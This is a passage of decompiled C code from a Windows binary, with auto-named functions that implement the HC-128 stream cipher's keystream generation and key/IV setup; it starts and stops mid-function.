    a1[v43] += __ROR4__(a1[1049], 24) + (__ROR4__(a1[v44], 9) ^ __ROR4__(a1[1040], 22));
    a1[1043] = a1[v43];
    a2[3] = a1[v43] ^ v40;
    LODWORD(v40) = a1[(unsigned __int8)BYTE2(a1[1048]) + 256] + a1[(unsigned __int8)a1[1048]];
    v45 = (unsigned int)(v4 + 517);
    a1[v44] += __ROR4__(a1[1050], 24) + (__ROR4__(a1[1041], 22) ^ __ROR4__(a1[v45], 9));
    a1[1044] = a1[v44];
    a2[4] = a1[v44] ^ v40;
    LODWORD(v40) = a1[(unsigned __int8)BYTE2(a1[1049]) + 256] + a1[(unsigned __int8)a1[1049]];
    v46 = (unsigned int)(v4 + 518);
    a1[v45] += __ROR4__(a1[1051], 24) + (__ROR4__(a1[1042], 22) ^ __ROR4__(a1[v46], 9));
    a1[1045] = a1[v45];
    a2[5] = a1[v45] ^ v40;
    LODWORD(v40) = a1[(unsigned __int8)BYTE2(a1[1050]) + 256] + a1[(unsigned __int8)a1[1050]];
    v47 = (unsigned int)(v4 + 519);
    a1[v46] += __ROR4__(a1[1052], 24) + (__ROR4__(a1[v47], 9) ^ __ROR4__(a1[1043], 22));
    a1[1046] = a1[v46];
    a2[6] = a1[v46] ^ v40;
    LODWORD(v40) = a1[(unsigned __int8)BYTE2(a1[1051]) + 256] + a1[(unsigned __int8)a1[1051]];
    v48 = (unsigned int)(v4 + 520);
    a1[v47] += __ROR4__(a1[1053], 24) + (__ROR4__(a1[v48], 9) ^ __ROR4__(a1[1044], 22));
    a1[1047] = a1[v47];
    a2[7] = a1[v47] ^ v40;
    LODWORD(v40) = a1[(unsigned __int8)BYTE2(a1[1052]) + 256] + a1[(unsigned __int8)a1[1052]];
    v49 = (unsigned int)(v4 + 521);
    a1[v48] += __ROR4__(a1[1054], 24) + (__ROR4__(a1[1045], 22) ^ __ROR4__(a1[v49], 9));
    a1[1048] = a1[v48];
    a2[8] = a1[v48] ^ v40;
    LODWORD(v40) = a1[(unsigned __int8)BYTE2(a1[1053]) + 256] + a1[(unsigned __int8)a1[1053]];
    v50 = (unsigned int)(v4 + 522);
    a1[v49] += __ROR4__(a1[1055], 24) + (__ROR4__(a1[v50], 9) ^ __ROR4__(a1[1046], 22));
    a1[1049] = a1[v49];
    a2[9] = a1[v49] ^ v40;
    LODWORD(v40) = a1[(unsigned __int8)BYTE2(a1[1054]) + 256] + a1[(unsigned __int8)a1[1054]];
    v51 = (unsigned int)(v4 + 523);
    a1[v50] += __ROR4__(a1[1040], 24) + (__ROR4__(a1[v51], 9) ^ __ROR4__(a1[1047], 22));
    a1[1050] = a1[v50];
    a2[10] = a1[v50] ^ v40;
    LODWORD(v40) = a1[(unsigned __int8)BYTE2(a1[1055]) + 256] + a1[(unsigned __int8)a1[1055]];
    v52 = (unsigned int)(v4 + 524);
    a1[v51] += __ROR4__(a1[1041], 24) + (__ROR4__(a1[v52], 9) ^ __ROR4__(a1[1048], 22));
    a1[1051] = a1[v51];
    a2[11] = a1[v51] ^ v40;
    LODWORD(v40) = a1[(unsigned __int8)BYTE2(a1[1040]) + 256] + a1[(unsigned __int8)a1[1040]];
    v53 = (unsigned int)(v4 + 525);
    a1[v52] += __ROR4__(a1[1042], 24) + (__ROR4__(a1[v53], 9) ^ __ROR4__(a1[1049], 22));
    a1[1052] = a1[v52];
    a2[12] = a1[v52] ^ v40;
    LODWORD(v40) = a1[(unsigned __int8)BYTE2(a1[1041]) + 256] + a1[(unsigned __int8)a1[1041]];
    v54 = (unsigned int)(v4 + 526);
    a1[v53] += __ROR4__(a1[1043], 24) + (__ROR4__(a1[v54], 9) ^ __ROR4__(a1[1050], 22));
    a1[1053] = a1[v53];
    a2[13] = a1[v53] ^ v40;
    LODWORD(v40) = a1[(unsigned __int8)BYTE2(a1[1042]) + 256] + a1[(unsigned __int8)a1[1042]];
    v55 = (unsigned int)(v4 + 527);
    a1[v54] += __ROR4__(a1[1044], 24) + (__ROR4__(a1[v55], 9) ^ __ROR4__(a1[1051], 22));
    a1[1054] = a1[v54];
    a2[14] = a1[v54] ^ v40;
    LODWORD(v54) = a1[(unsigned __int8)a1[1043]] + a1[(unsigned __int8)BYTE2(a1[1043]) + 256];
    a1[v55] += __ROR4__(a1[1045], 24) + (__ROR4__(a1[1052], 22) ^ __ROR4__(a1[(unsigned int)(v6 + 512)], 9));
    result = (unsigned int)a1[v55];
    a1[1055] = result;
    a2[15] = a1[v55] ^ v54;
  }
  else
  {
    v7 = a1[(unsigned __int8)a1[1028] + 512] + a1[(unsigned __int8)BYTE2(a1[1028]) + 768];
    v8 = (unsigned int)(v4 + 1);
    a1[v4] += __ROR4__(a1[1030], 8) + (__ROR4__(a1[v8], 23) ^ __ROR4__(a1[1037], 10));
    a1[1024] = a1[v4];
    *a2 = a1[v4] ^ v7;
    v9 = a1[(unsigned __int8)BYTE2(a1[1029]) + 768] + a1[(unsigned __int8)a1[1029] + 512];
    v10 = (unsigned int)(v4 + 2);
    a1[v8] += __ROR4__(a1[1031], 8) + (__ROR4__(a1[v10], 23) ^ __ROR4__(a1[1038], 10));
    a1[1025] = a1[v8];
    a2[1] = a1[v8] ^ v9;
    v11 = a1[(unsigned __int8)BYTE2(a1[1030]) + 768] + a1[(unsigned __int8)a1[1030] + 512];
    v12 = (unsigned int)(v4 + 3);
    a1[v10] += __ROR4__(a1[1032], 8) + (__ROR4__(a1[1039], 10) ^ __ROR4__(a1[v12], 23));
    a1[1026] = a1[v10];
    a2[2] = a1[v10] ^ v11;
    v13 = a1[(unsigned __int8)BYTE2(a1[1031]) + 768] + a1[(unsigned __int8)a1[1031] + 512];
    v14 = (unsigned int)(v4 + 4);
    a1[v12] += __ROR4__(a1[1033], 8) + (__ROR4__(a1[v14], 23) ^ __ROR4__(a1[1024], 10));
    a1[1027] = a1[v12];
    a2[3] = a1[v12] ^ v13;
    v15 = a1[(unsigned __int8)BYTE2(a1[1032]) + 768] + a1[(unsigned __int8)a1[1032] + 512];
    v16 = (unsigned int)(v4 + 5);
    a1[v14] += __ROR4__(a1[1034], 8) + (__ROR4__(a1[v16], 23) ^ __ROR4__(a1[1025], 10));
    a1[1028] = a1[v14];
    a2[4] = a1[v14] ^ v15;
    v17 = a1[(unsigned __int8)BYTE2(a1[1033]) + 768] + a1[(unsigned __int8)a1[1033] + 512];
    v18 = (unsigned int)(v4 + 6);
    a1[v16] += __ROR4__(a1[1035], 8) + (__ROR4__(a1[v18], 23) ^ __ROR4__(a1[1026], 10));
    a1[1029] = a1[v16];
    a2[5] = a1[v16] ^ v17;
    v19 = a1[(unsigned __int8)BYTE2(a1[1034]) + 768] + a1[(unsigned __int8)a1[1034] + 512];
    v20 = (unsigned int)(v4 + 7);
    a1[v18] += __ROR4__(a1[1036], 8) + (__ROR4__(a1[1027], 10) ^ __ROR4__(a1[v20], 23));
    a1[1030] = a1[v18];
    a2[6] = a1[v18] ^ v19;
    v21 = a1[(unsigned __int8)BYTE2(a1[1035]) + 768] + a1[(unsigned __int8)a1[1035] + 512];
    v22 = (unsigned int)(v4 + 8);
    a1[v20] += __ROR4__(a1[1037], 8) + (__ROR4__(a1[v22], 23) ^ __ROR4__(a1[1028], 10));
    a1[1031] = a1[v20];
    a2[7] = a1[v20] ^ v21;
    v23 = a1[(unsigned __int8)BYTE2(a1[1036]) + 768] + a1[(unsigned __int8)a1[1036] + 512];
    v24 = (unsigned int)(v4 + 9);
    a1[v22] += __ROR4__(a1[1038], 8) + (__ROR4__(a1[1029], 10) ^ __ROR4__(a1[v24], 23));
    a1[1032] = a1[v22];
    a2[8] = a1[v22] ^ v23;
    v25 = a1[(unsigned __int8)BYTE2(a1[1037]) + 768] + a1[(unsigned __int8)a1[1037] + 512];
    v26 = (unsigned int)(v4 + 10);
    a1[v24] += __ROR4__(a1[1039], 8) + (__ROR4__(a1[v26], 23) ^ __ROR4__(a1[1030], 10));
    a1[1033] = a1[v24];
    a2[9] = a1[v24] ^ v25;
    v27 = a1[(unsigned __int8)BYTE2(a1[1038]) + 768] + a1[(unsigned __int8)a1[1038] + 512];
    v28 = (unsigned int)(v4 + 11);
    a1[v26] += __ROR4__(a1[1024], 8) + (__ROR4__(a1[1031], 10) ^ __ROR4__(a1[v28], 23));
    a1[1034] = a1[v26];
    a2[10] = a1[v26] ^ v27;
    v29 = a1[(unsigned __int8)BYTE2(a1[1039]) + 768] + a1[(unsigned __int8)a1[1039] + 512];
    v30 = (unsigned int)(v4 + 12);
    a1[v28] += __ROR4__(a1[1025], 8) + (__ROR4__(a1[v30], 23) ^ __ROR4__(a1[1032], 10));
    a1[1035] = a1[v28];
    a2[11] = a1[v28] ^ v29;
    v31 = a1[(unsigned __int8)BYTE2(a1[1024]) + 768] + a1[(unsigned __int8)a1[1024] + 512];
    v32 = (unsigned int)(v4 + 13);
    a1[v30] += __ROR4__(a1[1026], 8) + (__ROR4__(a1[v32], 23) ^ __ROR4__(a1[1033], 10));
    a1[1036] = a1[v30];
    a2[12] = a1[v30] ^ v31;
    v33 = a1[(unsigned __int8)BYTE2(a1[1025]) + 768] + a1[(unsigned __int8)a1[1025] + 512];
    v34 = (unsigned int)(v4 + 14);
    a1[v32] += __ROR4__(a1[1027], 8) + (__ROR4__(a1[v34], 23) ^ __ROR4__(a1[1034], 10));
    a1[1037] = a1[v32];
    a2[13] = a1[v32] ^ v33;
    v35 = a1[(unsigned __int8)BYTE2(a1[1026]) + 768] + a1[(unsigned __int8)a1[1026] + 512];
    v36 = (unsigned int)(v4 + 15);
    a1[v34] += __ROR4__(a1[1028], 8) + (__ROR4__(a1[1035], 10) ^ __ROR4__(a1[v36], 23));
    a1[1038] = a1[v34];
    a2[14] = a1[v34] ^ v35;
    v37 = a1[(unsigned __int8)BYTE2(a1[1027]) + 768] + a1[(unsigned __int8)a1[1027] + 512];
    a1[v36] += __ROR4__(a1[1029], 8) + (__ROR4__(a1[1036], 10) ^ __ROR4__(a1[v6], 23));
    result = (unsigned int)a1[v36];
    a1[1039] = result;
    a2[15] = a1[v36] ^ v37;
  }
  return result;
}


// ----- sub_140015150 @ 0x140015150 -----
__int64 __fastcall sub_140015150(_DWORD *a1)
{
  unsigned int v1; // edx
  __int64 v3; // rbx
  __int16 v4; // di
  __int64 v5; // rdi
  __int64 v6; // r10
  __int64 v7; // r9
  int v8; // edx
  int v9; // eax
  int v10; // edx
  __int64 v11; // r10
  int v12; // eax
  int v13; // edx
  __int64 v14; // r9
  int v15; // eax
  int v16; // edx
  __int64 v17; // r10
  int v18; // eax
  int v19; // edx
  __int64 v20; // r9
  int v21; // eax
  int v22; // edx
  __int64 v23; // r10
  int v24; // eax
  int v25; // edx
  __int64 v26; // r9
  int v27; // eax
  int v28; // edx
  __int64 v29; // r10
  int v30; // eax
  int v31; // edx
  __int64 v32; // r9
  int v33; // eax
  int v34; // edx
  __int64 v35; // r10
  int v36; // eax
  int v37; // edx
  __int64 v38; // r9
  int v39; // eax
  int v40; // edx
  __int64 v41; // r10
  int v42; // eax
  int v43; // edx
  __int64 v44; // r9
  int v45; // eax
  int v46; // edx
  __int64 v47; // r10
  int v48; // eax
  int v49; // edx
  int v50; // eax
  __int64 v51; // rcx
  __int64 result; // rax
  int v53; // r8d
  __int64 v54; // r10
  __int64 v55; // r9
  int v56; // edx
  __int64 v57; // r9
  int v58; // eax
  int v59; // edx
  __int64 v60; // r10
  int v61; // eax
  int v62; // edx
  __int64 v63; // r9
  int v64; // eax
  int v65; // edx
  __int64 v66; // r10
  int v67; // eax
  int v68; // edx
  __int64 v69; // r9
  int v70; // eax
  int v71; // edx
  __int64 v72; // r10
  int v73; // eax
  int v74; // edx
  __int64 v75; // r9
  int v76; // eax
  int v77; // edx
  __int64 v78; // r10
  int v79; // eax
  int v80; // edx
  __int64 v81; // r9
  int v82; // eax
  int v83; // edx
  __int64 v84; // r10
  int v85; // eax
  int v86; // edx
  __int64 v87; // r9
  int v88; // eax
  int v89; // edx
  __int64 v90; // r10
  int v91; // eax
  int v92; // edx
  __int64 v93; // r9
  int v94; // eax
  int v95; // edx
  __int64 v96; // r10
  int v97; // eax
  int v98; // edx
  int v99; // eax
  int v100; // r8d

  v1 = a1[1056];
  v3 = v1 & 0x1FF;
  v4 = (a1[1056] & 0x1FF) + 16;
  a1[1056] = ((_WORD)v1 + 16) & 0x3FF;
  v5 = v4 & 0x1FF;
  if ( v1 >= 0x200 )
  {
    v54 = (unsigned int)(v3 + 513);
    v55 = (unsigned int)(v3 + 512);
    v56 = (a1[(unsigned __int8)a1[1044]] + a1[(unsigned __int8)BYTE2(a1[1044]) + 256])
        ^ (a1[v55] + __ROR4__(a1[1046], 24) + (__ROR4__(a1[1053], 22) ^ __ROR4__(a1[v54], 9)));
    a1[v55] = v56;
    v57 = (unsigned int)(v3 + 514);
    v58 = a1[1045];
    a1[1040] = v56;
    v59 = (a1[(unsigned __int8)v58] + a1[BYTE2(v58) + 256])
        ^ (a1[v54] + __ROR4__(a1[1047], 24) + (__ROR4__(a1[1054], 22) ^ __ROR4__(a1[v57], 9)));
    a1[v54] = v59;
    v60 = (unsigned int)(v3 + 515);
    v61 = a1[1046];
    a1[1041] = v59;
    v62 = (a1[(unsigned __int8)v61] + a1[BYTE2(v61) + 256])
        ^ (a1[v57] + __ROR4__(a1[1048], 24) + (__ROR4__(a1[1055], 22) ^ __ROR4__(a1[v60], 9)));
    a1[v57] = v62;
    v63 = (unsigned int)(v3 + 516);
    v64 = a1[1047];
    a1[1042] = v62;
    v65 = (a1[(unsigned __int8)v64] + a1[BYTE2(v64) + 256])
        ^ (a1[v60] + __ROR4__(a1[1049], 24) + (__ROR4__(a1[1040], 22) ^ __ROR4__(a1[v63], 9)));
    a1[v60] = v65;
    v66 = (unsigned int)(v3 + 517);
    v67 = a1[1048];
    a1[1043] = v65;
    v68 = (a1[(unsigned __int8)v67] + a1[BYTE2(v67) + 256])
        ^ (a1[v63] + __ROR4__(a1[1050], 24) + (__ROR4__(a1[1041], 22) ^ __ROR4__(a1[v66], 9)));
    a1[v63] = v68;
    v69 = (unsigned int)(v3 + 518);
    v70 = a1[1049];
    a1[1044] = v68;
    v71 = (a1[(unsigned __int8)v70] + a1[BYTE2(v70) + 256])
        ^ (a1[v66] + __ROR4__(a1[1051], 24) + (__ROR4__(a1[1042], 22) ^ __ROR4__(a1[v69], 9)));
    a1[v66] = v71;
    v72 = (unsigned int)(v3 + 519);
    v73 = a1[1050];
    a1[1045] = v71;
    v74 = (a1[(unsigned __int8)v73] + a1[BYTE2(v73) + 256])
        ^ (a1[v69] + __ROR4__(a1[1052], 24) + (__ROR4__(a1[1043], 22) ^ __ROR4__(a1[v72], 9)));
    a1[v69] = v74;
    v75 = (unsigned int)(v3 + 520);
    v76 = a1[1051];
    a1[1046] = v74;
    v77 = (a1[(unsigned __int8)v76] + a1[BYTE2(v76) + 256])
        ^ (a1[v72] + __ROR4__(a1[1053], 24) + (__ROR4__(a1[1044], 22) ^ __ROR4__(a1[v75], 9)));
    a1[v72] = v77;
    v78 = (unsigned int)(v3 + 521);
    v79 = a1[1052];
    a1[1047] = v77;
    v80 = (a1[(unsigned __int8)v79] + a1[BYTE2(v79) + 256])
        ^ (a1[v75] + __ROR4__(a1[1054], 24) + (__ROR4__(a1[1045], 22) ^ __ROR4__(a1[v78], 9)));
    a1[v75] = v80;
    v81 = (unsigned int)(v3 + 522);
    v82 = a1[1053];
    a1[1048] = v80;
    v83 = (a1[(unsigned __int8)v82] + a1[BYTE2(v82) + 256])
        ^ (a1[v78] + __ROR4__(a1[1055], 24) + (__ROR4__(a1[1046], 22) ^ __ROR4__(a1[v81], 9)));
    a1[v78] = v83;
    v84 = (unsigned int)(v3 + 523);
    v85 = a1[1054];
    a1[1049] = v83;
    v86 = (a1[(unsigned __int8)v85] + a1[BYTE2(v85) + 256])
        ^ (a1[v81] + __ROR4__(a1[1040], 24) + (__ROR4__(a1[1047], 22) ^ __ROR4__(a1[v84], 9)));
    a1[v81] = v86;
    v87 = (unsigned int)(v3 + 524);
    v88 = a1[1055];
    a1[1050] = v86;
    v89 = (a1[(unsigned __int8)v88] + a1[BYTE2(v88) + 256])
        ^ (a1[v84] + __ROR4__(a1[1041], 24) + (__ROR4__(a1[1048], 22) ^ __ROR4__(a1[v87], 9)));
    a1[v84] = v89;
    v90 = (unsigned int)(v3 + 525);
    v91 = a1[1040];
    a1[1051] = v89;
    v92 = (a1[(unsigned __int8)v91] + a1[BYTE2(v91) + 256])
        ^ (a1[v87] + __ROR4__(a1[1042], 24) + (__ROR4__(a1[1049], 22) ^ __ROR4__(a1[v90], 9)));
    a1[v87] = v92;
    v93 = (unsigned int)(v3 + 526);
    v94 = a1[1041];
    a1[1052] = v92;
    v95 = (a1[(unsigned __int8)v94] + a1[BYTE2(v94) + 256])
        ^ (a1[v90] + __ROR4__(a1[1043], 24) + (__ROR4__(a1[1050], 22) ^ __ROR4__(a1[v93], 9)));
    a1[v90] = v95;
    v96 = (unsigned int)(v3 + 527);
    v97 = a1[1042];
    a1[1053] = v95;
    v98 = (a1[(unsigned __int8)v97] + a1[BYTE2(v97) + 256])
        ^ (a1[v93] + __ROR4__(a1[1044], 24) + (__ROR4__(a1[1051], 22) ^ __ROR4__(a1[v96], 9)));
    a1[v93] = v98;
    v99 = a1[1043];
    v100 = a1[1045];
    a1[1054] = v98;
    result = (a1[(unsigned __int8)v99] + a1[BYTE2(v99) + 256])
           ^ (unsigned int)(a1[v96]
                          + __ROR4__(v100, 24)
                          + (__ROR4__(a1[1052], 22) ^ __ROR4__(a1[(unsigned int)(v5 + 512)], 9)));
    a1[v96] = result;
    a1[1055] = result;
  }
  else
  {
    v6 = (unsigned int)(v3 + 1);
    v7 = (unsigned int)(v3 + 2);
    v8 = (a1[(unsigned __int8)a1[1028] + 512] + a1[(unsigned __int8)BYTE2(a1[1028]) + 768])
       ^ (a1[v3] + __ROR4__(a1[1030], 8) + (__ROR4__(a1[1037], 10) ^ __ROR4__(a1[v6], 23)));
    a1[v3] = v8;
    v9 = a1[1029];
    a1[1024] = v8;
    v10 = (a1[(unsigned __int8)v9 + 512] + a1[BYTE2(v9) + 768])
        ^ (a1[v6] + __ROR4__(a1[1031], 8) + (__ROR4__(a1[1038], 10) ^ __ROR4__(a1[v7], 23)));
    a1[v6] = v10;
    v11 = (unsigned int)(v3 + 3);
    v12 = a1[1030];
    a1[1025] = v10;
    v13 = (a1[(unsigned __int8)v12 + 512] + a1[BYTE2(v12) + 768])
        ^ (a1[v7] + __ROR4__(a1[1032], 8) + (__ROR4__(a1[1039], 10) ^ __ROR4__(a1[v11], 23)));
    a1[v7] = v13;
    v14 = (unsigned int)(v3 + 4);
    v15 = a1[1031];
    a1[1026] = v13;
    v16 = (a1[(unsigned __int8)v15 + 512] + a1[BYTE2(v15) + 768])
        ^ (a1[v11] + __ROR4__(a1[1033], 8) + (__ROR4__(a1[1024], 10) ^ __ROR4__(a1[v14], 23)));
    a1[v11] = v16;
    v17 = (unsigned int)(v3 + 5);
    v18 = a1[1032];
    a1[1027] = v16;
    v19 = (a1[(unsigned __int8)v18 + 512] + a1[BYTE2(v18) + 768])
        ^ (a1[v14] + __ROR4__(a1[1034], 8) + (__ROR4__(a1[1025], 10) ^ __ROR4__(a1[v17], 23)));
    a1[v14] = v19;
    v20 = (unsigned int)(v3 + 6);
    v21 = a1[1033];
    a1[1028] = v19;
    v22 = (a1[(unsigned __int8)v21 + 512] + a1[BYTE2(v21) + 768])
        ^ (a1[v17] + __ROR4__(a1[1035], 8) + (__ROR4__(a1[1026], 10) ^ __ROR4__(a1[v20], 23)));
    a1[v17] = v22;
    v23 = (unsigned int)(v3 + 7);
    v24 = a1[1034];
    a1[1029] = v22;
    v25 = (a1[(unsigned __int8)v24 + 512] + a1[BYTE2(v24) + 768])
        ^ (a1[v20] + __ROR4__(a1[1036], 8) + (__ROR4__(a1[1027], 10) ^ __ROR4__(a1[v23], 23)));
    a1[v20] = v25;
    v26 = (unsigned int)(v3 + 8);
    v27 = a1[1035];
    a1[1030] = v25;
    v28 = (a1[(unsigned __int8)v27 + 512] + a1[BYTE2(v27) + 768])
        ^ (a1[v23] + __ROR4__(a1[1037], 8) + (__ROR4__(a1[1028], 10) ^ __ROR4__(a1[v26], 23)));
    a1[v23] = v28;
    v29 = (unsigned int)(v3 + 9);
    v30 = a1[1036];
    a1[1031] = v28;
    v31 = (a1[(unsigned __int8)v30 + 512] + a1[BYTE2(v30) + 768])
        ^ (a1[v26] + __ROR4__(a1[1038], 8) + (__ROR4__(a1[1029], 10) ^ __ROR4__(a1[v29], 23)));
    a1[v26] = v31;
    v32 = (unsigned int)(v3 + 10);
    v33 = a1[1037];
    a1[1032] = v31;
    v34 = (a1[(unsigned __int8)v33 + 512] + a1[BYTE2(v33) + 768])
        ^ (a1[v29] + __ROR4__(a1[1039], 8) + (__ROR4__(a1[1030], 10) ^ __ROR4__(a1[v32], 23)));
    a1[v29] = v34;
    v35 = (unsigned int)(v3 + 11);
    v36 = a1[1038];
    a1[1033] = v34;
    v37 = (a1[(unsigned __int8)v36 + 512] + a1[BYTE2(v36) + 768])
        ^ (a1[v32] + __ROR4__(a1[1024], 8) + (__ROR4__(a1[1031], 10) ^ __ROR4__(a1[v35], 23)));
    a1[v32] = v37;
    v38 = (unsigned int)(v3 + 12);
    v39 = a1[1039];
    a1[1034] = v37;
    v40 = (a1[(unsigned __int8)v39 + 512] + a1[BYTE2(v39) + 768])
        ^ (a1[v35] + __ROR4__(a1[1025], 8) + (__ROR4__(a1[1032], 10) ^ __ROR4__(a1[v38], 23)));
    a1[v35] = v40;
    v41 = (unsigned int)(v3 + 13);
    v42 = a1[1024];
    a1[1035] = v40;
    v43 = (a1[(unsigned __int8)v42 + 512] + a1[BYTE2(v42) + 768])
        ^ (a1[v38] + __ROR4__(a1[1026], 8) + (__ROR4__(a1[1033], 10) ^ __ROR4__(a1[v41], 23)));
    a1[v38] = v43;
    v44 = (unsigned int)(v3 + 14);
    v45 = a1[1025];
    a1[1036] = v43;
    v46 = (a1[(unsigned __int8)v45 + 512] + a1[BYTE2(v45) + 768])
        ^ (a1[v41] + __ROR4__(a1[1027], 8) + (__ROR4__(a1[1034], 10) ^ __ROR4__(a1[v44], 23)));
    a1[v41] = v46;
    v47 = (unsigned int)(v3 + 15);
    v48 = a1[1026];
    a1[1037] = v46;
    v49 = (a1[(unsigned __int8)v48 + 512] + a1[BYTE2(v48) + 768])
        ^ (a1[v44] + __ROR4__(a1[1028], 8) + (__ROR4__(a1[1035], 10) ^ __ROR4__(a1[v47], 23)));
    a1[v44] = v49;
    v50 = a1[1027];
    a1[1038] = v49;
    v51 = (unsigned __int8)v50;
    result = BYTE2(v50);
    v53 = (a1[v51 + 512] + a1[result + 768])
        ^ (a1[v47] + __ROR4__(a1[1029], 8) + (__ROR4__(a1[1036], 10) ^ __ROR4__(a1[v5], 23)));
    a1[v47] = v53;
    a1[1039] = v53;
  }
  return result;
}


// ----- nullsub_1 @ 0x140015c40 -----
void nullsub_1()
{
  ;
}


// ----- sub_140015C50 @ 0x140015c50 -----
__int64 __fastcall sub_140015C50(__int64 a1, __int64 a2, unsigned int a3, int a4)
{
  __int64 result; // rax
  unsigned int v5; // r8d

  *(_DWORD *)(a1 + 4292) = a3;
  result = 0;
  v5 = a3 >> 5;
  *(_DWORD *)(a1 + 4296) = a4;
  if ( v5 == 0 )
    goto LABEL_7;
  do
  {
    *(_DWORD *)(a1 + 4 * result + 4228) = *(_DWORD *)(a2 + 4 * result);
    result = (unsigned int)(result + 1);
  }
  while ( (unsigned int)result < v5 );
  if ( (unsigned int)result < 8 )
  {
LABEL_7:
    do
    {
      *(_DWORD *)(a1 + 4 * result + 4228) = *(_DWORD *)(a1 + 4LL * (unsigned int)(result - 4) + 4228);
      result = (unsigned int)(result + 1);
    }
    while ( (unsigned int)result < 8 );
  }
  return result;
}


// ----- sub_140015CC0 @ 0x140015cc0 -----
__int64 __fastcall sub_140015CC0(__int64 a1, __int64 a2)
{
  __int64 v2; // r8
  _DWORD *v4; // r9
  unsigned int v5; // ebp
  unsigned int v6; // r14d
  unsigned int v7; // r10d
  unsigned int v8; // esi
  unsigned int v9; // edi
  unsigned int v10; // r11d
  unsigned int v11; // r10d
  unsigned int v12; // edx
  int v13; // r9d
  __int64 v14; // rdx
  int v15; // eax
  unsigned int v16; // r11d
  unsigned int v17; // edi
  unsigned int v18; // r10d
  unsigned int v19; // r11d
  unsigned int v20; // r9d
  __int64 v21; // rcx
  unsigned int v22; // edx
  int v23; // r8d
  __int64 v24; // rax
  int v25; // edi
  __int64 result; // rax

  v2 = 0;
  if ( *(_DWORD *)(a1 + 4296) >> 5 == 0 )
    goto LABEL_5;
  v4 = (_DWORD *)(a1 + 4260);
  do
  {
    v4[v2] = *(_DWORD *)(a2 + 4 * v2);
    v2 = (unsigned int)(v2 + 1);
  }
  while ( (unsigned int)v2 < *(_DWORD *)(a1 + 4296) >> 5 );
  if ( (unsigned int)v2 < 8 )
  {
LABEL_5:
    v4 = (_DWORD *)(a1 + 4260);
    do
    {
      v4[v2] = v4[(unsigned int)(v2 - 4)];
      v2 = (unsigned int)(v2 + 1);
    }
    while ( (unsigned int)v2 < 8 );
  }
  v5 = 16;
  *(_DWORD *)a1 = *(_DWORD *)(a1 + 4228);
  v6 = 16;
  *(_DWORD *)(a1 + 4) = *(_DWORD *)(a1 + 4232);
  *(_DWORD *)(a1 + 8) = *(_DWORD *)(a1 + 4236);
  *(_DWORD *)(a1 + 12) = *(_DWORD *)(a1 + 4240);
  *(_DWORD *)(a1 + 16) = *(_DWORD *)(a1 + 4244);
  *(_DWORD *)(a1 + 20) = *(_DWORD *)(a1 + 4248);
  *(_DWORD *)(a1 + 24) = *(_DWORD *)(a1 + 4252);
  *(_DWORD *)(a1 + 28) = *(_DWORD *)(a1 + 4256);
  *(_DWORD *)(a1 + 32) = *v4;
  *(_DWORD *)(a1 + 36) = *(_DWORD *)(a1 + 4264);
  *(_DWORD *)(a1 + 40) = *(_DWORD *)(a1 + 4268);
  *(_DWORD *)(a1 + 44) = *(_DWORD *)(a1 + 4272);
  *(_DWORD *)(a1 + 48) = *(_DWORD *)(a1 + 4276);
  *(_DWORD *)(a1 + 52) = *(_DWORD *)(a1 + 4280);
  *(_DWORD *)(a1 + 56) = *(_DWORD *)(a1 + 4284);
  *(_DWORD *)(a1 + 60) = *(_DWORD *)(a1 + 4288);
  do
  {
    v7 = *(_DWORD *)(a1 + 4LL * (v6 - 15));
    v8 = *(_DWORD *)(a1 + 4LL * (v6 - 7))
       + *(_DWORD *)(a1 + 4LL * (v6 - 16))
       + ((*(_DWORD *)(a1 + 4LL * (v6 - 2)) >> 10)
        ^ __ROR4__(*(_DWORD *)(a1 + 4LL * (v6 - 2)), 19)
        ^ __ROR4__(*(_DWORD *)(a1 + 4LL * (v6 - 2)), 17))
       + v6
       + ((v7 >> 3) ^ __ROR4__(v7, 7) ^ __ROR4__(v7, 18));
    *(_DWORD *)(a1 + 4LL * v6) = v8;
    v9 = *(_DWORD *)(a1 + 4LL * (v6 - 14));
    v10 = *(_DWORD *)(a1 + 4LL * (v6 - 6))
        + v6
        + v7
        + 1
        + ((v9 >> 3) ^ __ROR4__(v9, 7) ^ __ROR4__(v9, 18))
        + ((*(_DWORD *)(a1 + 4LL * (v6 - 1)) >> 10)
         ^ __ROR4__(*(_DWORD *)(a1 + 4LL * (v6 - 1)), 19)
         ^ __ROR4__(*(_DWORD *)(a1 + 4LL * (v6 - 1)), 17));
    *(_DWORD *)(a1 + 4LL * (v6 + 1)) = v10;
    v11 = *(_DWORD *)(a1 + 4LL * (v6 - 13));
    *(_DWORD *)(a1 + 4LL * (v6 + 2)) = *(_DWORD *)(a1 + 4LL * (v6 - 5))
                                     + ((v8 >> 10) ^ __ROR4__(v8, 19) ^ __ROR4__(v8, 17))
                                     + 2
                                     + v9
                                     + v6
                                     + ((v11 >> 3) ^ __ROR4__(v11, 7) ^ __ROR4__(v11, 18));
    v12 = *(_DWORD *)(a1 + 4LL * (v6 - 12));
    v13 = v11 + v6 + ((v12 >> 3) ^ __ROR4__(v12, 7) ^ __ROR4__(v12, 18));
    v14 = v6 + 3;
    v15 = *(_DWORD *)(a1 + 4LL * (v6 - 4));
    v6 += 4;
    *(_DWORD *)(a1 + 4 * v14) = v15 + ((v10 >> 10) ^ __ROR4__(v10, 19) ^ __ROR4__(v10, 17)) + 3 + v13;
  }
  while ( v6 < 0x110 );
  *(_OWORD *)a1 = *(_OWORD *)(a1 + 1024);
  *(_OWORD *)(a1 + 16) = *(_OWORD *)(a1 + 1040);
  *(_OWORD *)(a1 + 32) = *(_OWORD *)(a1 + 1056);
  *(_OWORD *)(a1 + 48) = *(_OWORD *)(a1 + 1072);
  do
  {
    v16 = v5 + *(_DWORD *)(a1 + 4LL * (v5 - 15));
    v17 = *(_DWORD *)(a1 + 4LL * (v5 - 7))
        + 256
        + v5
        + ((*(_DWORD *)(a1 + 4LL * (v5 - 2)) >> 10)
         ^ __ROR4__(*(_DWORD *)(a1 + 4LL * (v5 - 2)), 19)
         ^ __ROR4__(*(_DWORD *)(a1 + 4LL * (v5 - 2)), 17))
        + ((*(_DWORD *)(a1 + 4LL * (v5 - 15)) >> 3)
         ^ __ROR4__(*(_DWORD *)(a1 + 4LL * (v5 - 15)), 7)
         ^ __ROR4__(*(_DWORD *)(a1 + 4LL * (v5 - 15)), 18))
        + *(_DWORD *)(a1 + 4LL * (v5 - 16));
    *(_DWORD *)(a1 + 4LL * v5) = v17;
    v18 = *(_DWORD *)(a1 + 4LL * (v5 - 14));
    v19 = *(_DWORD *)(a1 + 4LL * (v5 - 6))
        + 257
